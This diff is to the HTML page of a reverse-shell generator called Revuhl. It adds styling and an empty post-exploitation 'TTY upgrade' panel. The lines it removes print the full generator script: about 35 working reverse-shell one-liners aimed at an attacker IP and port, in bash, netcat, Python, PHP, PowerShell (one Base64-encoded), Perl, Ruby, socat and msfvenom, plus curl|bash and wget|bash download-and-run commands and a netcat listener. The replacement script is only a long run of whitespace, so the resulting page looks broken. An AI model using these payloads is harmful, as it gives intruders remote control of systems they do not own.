@@ -152,6 +152,60 @@
     flex: 1; color: var(--muted); font-size: .85rem; padding: 1rem;
   }
 
+  /* TTY Upgrade section */
+  .tty-section {
+    margin-top: 1.5rem;
+  }
+  .tty-toggle {
+    display: flex; align-items: center; gap: .5rem;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: .65rem 1rem; cursor: pointer;
+    font-size: .9rem; font-weight: 600; color: var(--text);
+    transition: border-color .15s; user-select: none; width: 100%;
+  }
+  .tty-toggle:hover { border-color: var(--muted); }
+  .tty-toggle .arrow {
+    font-size: .7rem; color: var(--muted); transition: transform .2s;
+  }
+  .tty-toggle.open .arrow { transform: rotate(90deg); }
+  .tty-toggle .badge {
+    font-size: .7rem; padding: .1rem .45rem; border-radius: 99px;
+    background: rgba(63,185,80,.12); color: var(--green); margin-left: auto;
+  }
+  .tty-grid {
+    display: none; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: .75rem; margin-top: .75rem;
+  }
+  .tty-grid.open { display: grid; }
+  .tty-card {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; overflow: hidden;
+  }
+  .tty-card-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: .5rem .85rem; border-bottom: 1px solid var(--border);
+  }
+  .tty-card-name { font-size: .8rem; font-weight: 600; }
+  .tty-card-step {
+    font-size: .65rem; padding: .1rem .4rem; border-radius: 99px;
+    background: rgba(88,166,255,.12); color: var(--accent);
+  }
+  .tty-card-body { position: relative; }
+  .tty-card-body pre {
+    margin: 0; padding: .75rem .85rem; padding-right: 4rem; overflow-x: auto;
+    font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+    font-size: .82rem; line-height: 1.5; color: var(--text);
+    background: var(--code-bg); white-space: pre-wrap; word-break: break-all;
+  }
+  .tty-card-body .copy-btn {
+    position: absolute; top: .4rem; right: .4rem;
+    background: var(--surface); border: 1px solid var(--border);
+    color: var(--muted); padding: .25rem .55rem; border-radius: 5px;
+    cursor: pointer; font-size: .7rem; transition: all .15s;
+  }
+  .tty-card-body .copy-btn:hover { color: var(--text); border-color: var(--muted); }
+  .tty-card-body .copy-btn.copied { color: var(--green); border-color: var(--green); }
+
   footer {
     text-align: center; color: var(--muted);
     font-size: .75rem; margin-top: 2rem;
@@ -210,145 +264,21 @@
     </div>
   </div>
 
+  <!-- TTY Upgrade Snippets -->
+  <div class="tty-section">
+    <button class="tty-toggle" id="tty-toggle">
+      <span class="arrow">&#9654;</span>
+      TTY Shell Upgrade
+      <span class="badge">Post-Exploit</span>
+    </button>
+    <div class="tty-grid" id="tty-grid"></div>
+  </div>
+
   <footer>Revuhl &mdash; Use responsibly and only with proper authorization.</footer>
 </div>
 
 <script>
-(function () {
-  "use strict";
-
-  const ipEl        = document.getElementById("ip");
-  const portEl      = document.getElementById("port");
-  const encodingEl  = document.getElementById("encoding");
-  const shellListEl = document.getElementById("shell-list");
-  const outputTitle = document.getElementById("output-title");
-  const outputTag   = document.getElementById("output-tag");
-  const outputBody  = document.getElementById("output-body");
-  const listenerEl  = document.getElementById("listener-cmd");
-  const listenerPill = document.getElementById("listener-pill");
-
-  /* ── shell definitions ── */
-  const shells = [
-    { name: "Bash -i",          fn: (ip, p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
-    { name: "Bash read",        fn: (ip, p) => `0<&196;exec 196<>/dev/tcp/${ip}/${p}; bash <&196 >&196 2>&196` },
-    { name: "Bash 5",           fn: (ip, p) => `bash -i 5<> /dev/tcp/${ip}/${p} 0<&5 1>&5 2>&5` },
-    { name: "Bash UDP",         fn: (ip, p) => `bash -i >& /dev/udp/${ip}/${p} 0>&1` },
-    { name: "nc -e",            fn: (ip, p) => `nc ${ip} ${p} -e /bin/bash` },
-    { name: "nc -c",            fn: (ip, p) => `nc -c /bin/bash ${ip} ${p}` },
-    { name: "nc mkfifo",        fn: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${p} >/tmp/f` },
-    { name: "nc -i (OpenBSD)",  fn: (ip, p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
-    { name: "ncat (SSL)",       fn: (ip, p) => `ncat --ssl ${ip} ${p} -e /bin/bash` },
-    { name: "BusyBox nc",       fn: (ip, p) => `busybox nc ${ip} ${p} -e /bin/sh` },
-    { name: "Python3",          fn: (ip, p) => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
-    { name: "Python3 subprocess", fn: (ip, p) => `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${ip}",${p}));subprocess.call(["/bin/bash","-i"],stdin=s,stdout=s,stderr=s)'` },
-    { name: "Python2",          fn: (ip, p) => `python -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
-    { name: "PHP exec",         fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/bash -i <&3 >&3 2>&3");'` },
-    { name: "PHP proc_open",    fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
-    { name: "PHP system",       fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});while($cmd=fgets($sock)){$output=shell_exec($cmd);fwrite($sock,$output);}'` },
-    { name: "PowerShell #1",    fn: (ip, p) => `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"` },
-    { name: "PowerShell #2 (Base64)", fn: (ip, p) => {
-      const inner = `$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;
-      return `powershell -nop -enc ${btoa(unescape(encodeURIComponent(inner)))}`;
-    }},
-    { name: "CMD",              fn: (ip, p) => `cmd.exe /c "start /b powershell -nop -c \\"$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()\\""` },
-    { name: "curl + bash",      fn: (ip, p) => `curl http://${ip}:${p}/shell.sh | bash` },
-    { name: "wget + bash",      fn: (ip, p) => `wget -qO- http://${ip}:${p}/shell.sh | bash` },
-    { name: "Ruby",             fn: (ip, p) => `ruby -rsocket -e'spawn("/bin/bash",[:in,:out,:err]=>TCPSocket.new("${ip}",${p}))'` },
-    { name: "Ruby fork",        fn: (ip, p) => `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}",${p});loop{c.gets.chomp!;(IO.popen($$_,"r"){|io|c.print io.read})rescue nil}'` },
-    { name: "Perl",             fn: (ip, p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'` },
-    { name: "Perl no sh",       fn: (ip, p) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${p}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` },
-    { name: "Socat",            fn: (ip, p) => `socat TCP:${ip}:${p} EXEC:/bin/bash` },
-    { name: "Socat TTY",        fn: (ip, p) => `socat TCP:${ip}:${p} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane` },
-    { name: "Lua",              fn: (ip, p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${p}');os.execute('/bin/bash -i <&3 >&3 2>&3');"` },
-    { name: "Awk",              fn: (ip, p) => `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${p}"; while(42) { do{ printf "$ " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
-    { name: "Java",             fn: (ip, p) => `Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done"}); p.waitFor();` },
-    { name: "xterm",            fn: (ip, p) => `xterm -display ${ip}:1` },
-    { name: "msfvenom (linux staged)", fn: (ip, p) => `msfvenom -p linux/x64/shell/reverse_tcp LHOST=${ip} LPORT=${p} -f elf -o rev.elf` },
-    { name: "msfvenom (linux)",  fn: (ip, p) => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f elf -o rev.elf` },
-    { name: "msfvenom (windows)", fn: (ip, p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f exe -o rev.exe` },
-  ];
-
-  let selectedIdx = null;
-  const itemEls = [];
-
-  /* ── build shell list ── */
-  shells.forEach((s, i) => {
-    const item = document.createElement("div");
-    item.className = "shell-item";
-    item.textContent = s.name;
-    item.addEventListener("click", () => selectShell(i));
-    shellListEl.appendChild(item);
-    itemEls[i] = item;
-  });
-
-  /* ── selection ── */
-  function selectShell(idx) {
-    selectedIdx = idx;
-    itemEls.forEach((el, i) => el.classList.toggle("active", i === idx));
-    render();
-  }
-
-  /* ── helpers ── */
-  function sanitize(text) {
-    const el = document.createElement("span");
-    el.textContent = text;
-    return el.innerHTML;
-  }
-
-  function encode(raw, method) {
-    if (method === "base64") return btoa(unescape(encodeURIComponent(raw)));
-    if (method === "url") return encodeURIComponent(raw);
-    return raw;
-  }
-
-  function copyText(text, btn) {
-    navigator.clipboard.writeText(text).then(() => {
-      const orig = btn.textContent;
-      btn.textContent = "Copied!";
-      btn.classList.add("copied");
-      setTimeout(() => { btn.textContent = orig; btn.classList.remove("copied"); }, 1500);
-    });
-  }
-
-  /* ── render output ── */
-  function render() {
-    const ip   = ipEl.value.trim() || "10.10.14.1";
-    const port = portEl.value.trim() || "4444";
-    const enc  = encodingEl.value;
-
-    listenerEl.textContent = `nc -lvnp ${port}`;
-
-    if (selectedIdx === null) {
-      outputTitle.innerHTML = "Select a shell &larr;";
-      outputTag.textContent = "";
-      outputBody.innerHTML = '<div class="empty-state">Pick a reverse shell from the list</div>';
-      return;
-    }
-
-    const s = shells[selectedIdx];
-    const raw = s.fn(ip, port);
-    const display = encode(raw, enc);
-
-    outputTitle.textContent = s.name;
-    outputTag.textContent = "";
-    outputBody.innerHTML = `
-      <pre>${sanitize(display)}</pre>
-      <button class="copy-btn" title="Copy to clipboard">Copy</button>`;
-    outputBody.querySelector(".copy-btn").addEventListener("click", function () {
-      copyText(display, this);
-    });
-  }
-
-  /* ── events ── */
-  listenerPill.addEventListener("click", function () {
-    copyText(listenerEl.textContent, this);
-  });
-
-  [ipEl, portEl, encodingEl].forEach(el => el.addEventListener("input", render));
-
-  /* Select first shell by default */
-  selectShell(0);
-})();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 </script>
 </body>
 </html>
